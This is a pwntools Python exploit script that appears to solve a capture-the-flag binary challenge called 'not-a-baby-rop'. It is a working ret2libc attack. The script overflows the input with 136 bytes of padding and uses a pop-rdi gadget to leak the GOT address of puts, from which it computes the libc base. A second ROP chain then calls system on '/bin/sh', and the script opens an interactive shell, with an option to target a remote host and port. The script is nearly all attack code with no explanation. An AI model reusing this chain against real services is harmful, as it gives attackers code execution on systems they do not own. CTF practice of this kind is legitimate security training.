from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *0x000000000040115d
continue
'''.format(**locals())

exe = './challenge/not-a-baby-rop'
elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc
p = start()

pop_rdi_ret = 0x000000000040122b
ret = 0x0000000000401016

# leak got puts
p.sendlineafter(b"let's see what u got\n", flat(
    cyclic(136),
    pop_rdi_ret,
    elf.got.puts,
    elf.plt.puts,
    elf.entrypoint
))

leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
info("Leak got puts: " + hex(leak))
libc.address = leak - libc.sym.puts

p.sendlineafter(b"let's see what u got\n", flat(
    cyclic(136),
    pop_rdi_ret,
    next(libc.search(b'/bin/sh\x00')),
    ret,
    libc.sym.system,
))

p.interactive()
